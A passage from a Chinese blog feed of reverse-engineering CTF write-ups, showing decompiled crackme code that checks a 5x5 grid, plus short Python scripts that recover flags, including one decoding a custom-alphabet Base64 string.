class="comment">// [rsp+28h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">char</span> v9; <span class="comment">// [rsp+2Ah] [rbp-16h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v10; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v10 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v5 = <span class="number">0LL</span>;</span><br><span class="line">  v6 = <span class="number">0</span>;</span><br><span class="line">  v7 = <span class="number">0LL</span>;</span><br><span class="line">  v8 = <span class="number">0</span>;</span><br><span class="line">  v9 = <span class="number">0</span>;</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%s&quot;</span>, &amp;v5);</span><br><span class="line">  <span class="keyword">if</span> ( sub_4006D6(&amp;v5) )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = sub_400758(&amp;v5, <span class="number">0LL</span>, <span class="number">10LL</span>);</span><br><span class="line">    sub_400807(v4, &amp;v7);</span><br><span class="line">    v9 = <span class="number">0</span>;</span><br><span class="line">    sub_400881(&amp;v7);</span><br><span class="line">    <span class="keyword">if</span> ( sub_400917() )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;TQL!&quot;</span>);</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;flag&#123;&quot;</span>);</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, &amp;v5);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;&#125;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;your are cxk!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v10;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>经过了几次变换，重要的是这个：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">sub_400917</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v1; <span class="comment">// [rsp+0h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">int</span> j; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line">  <span class="keyword">int</span> k; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  v1 = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">4</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">4</span>; ++j )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">for</span> ( k = j + <span class="number">1</span>; k &lt;= <span class="number">4</span>; ++k )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( *(&amp;byte_601060 + <span class="number">5</span> * i + j) == *(&amp;byte_601060 + <span class="number">5</span> * i + k) )</span><br><span class="line">          v1 = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> ( *(&amp;byte_601060 + <span class="number">5</span> * j + i) == *(&amp;byte_601060 + <span class="number">5</span> * k + i) )</span><br><span class="line">          v1 = <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>应该是个5*5的东西，发现了：<code>14#2330#1#0#23##3##042##1</code></p><p>是和数独差不多的东西</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">14#23</span><br><span class="line">30#1#</span><br><span class="line">0#23#</span><br><span class="line">#3##0</span><br><span class="line">42##1</span><br></pre></td></tr></table></figure><p>看了好多wp终于看懂了，他上面的判断只是判断了每一行和每一列不能有相同的而已，so：<code>0 4 2 1 4 2 1 4 3 0</code> </p><p>输出0123456789动调下（这个等明天调，<a href="https://blog.csdn.net/Palmer9/article/details/104613420%EF%BC%89%EF%BC%8C%EF%BC%88%E6%88%96%E8%80%85%E5%8F%AF%E4%BB%A5%E6%A0%B9%E6%8D%AE%E4%BB%A5%E4%B8%8A%E7%9A%84%E4%BB%A3%E7%A0%81%E7%9C%8B%E5%87%BA%EF%BC%89">https://blog.csdn.net/Palmer9/article/details/104613420），（或者可以根据以上的代码看出）</a></p><p>得到：0123456789 —&gt; 7381940526，最后exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">model = [<span class="number">7</span>, <span class="number">3</span>, <span class="number">8</span>, <span class="number">1</span>, <span class="number">9</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">2</span>, <span class="number">6</span>]</span><br><span class="line">s = [<span class="number">48</span>, <span class="number">52</span>, <span class="number">50</span>, <span class="number">49</span>, <span class="number">52</span>, <span class="number">50</span>, <span class="number">49</span>, <span class="number">52</span>, <span class="number">51</span>, <span class="number">48</span>]</span><br><span class="line">flag = [<span class="number">0</span>] * <span class="number">10</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    flag[model[i]] = <span class="built_in">chr</span>(s[i])</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span>.join(flag)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><h1 id="0x24-特殊的-BASE64"><a href="#0x24-特殊的-BASE64" class="headerlink" title="0x24.特殊的 BASE64"></a>0x24.特殊的 BASE64</h1><p>无壳，变表base64</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">str1 = <span class="string">&quot;mTyqm7wjODkrNLcWl0eqO8K8gc1BPk1GNLgUpI==&quot;</span></span><br><span class="line"></span><br><span class="line">string1 = <span class="string">&quot;AaBbCcDdEeFfGgHhIiJjKkLlMmNnOoPpQqRrSsTtUuVvWwXxYyZz0987654321+/&quot;</span></span><br><span class="line">string2 = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(base64.b64decode(str1.translate(<span class="built_in">str</span>.maketrans(string1, string2))))</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;之前写过一部分re的题解，最近又有点想搞re了，重来吧。(从01开始计)&lt;/p&gt;
&lt;h1 id=&quot;0x01-简单注册器&quot;&gt;&lt;a href=&quot;#0x01-简单注册器&quot; class=&quot;headerlink&quot; title=&quot;0x01.简单注册器&quot;&gt;&lt;/a&gt;0x01.简单注册器&lt;/</summary>
      
    
    
    
    
    <category term="RE" scheme="http://example.com/tags/RE/"/>
    
  </entry>
  
</feed>
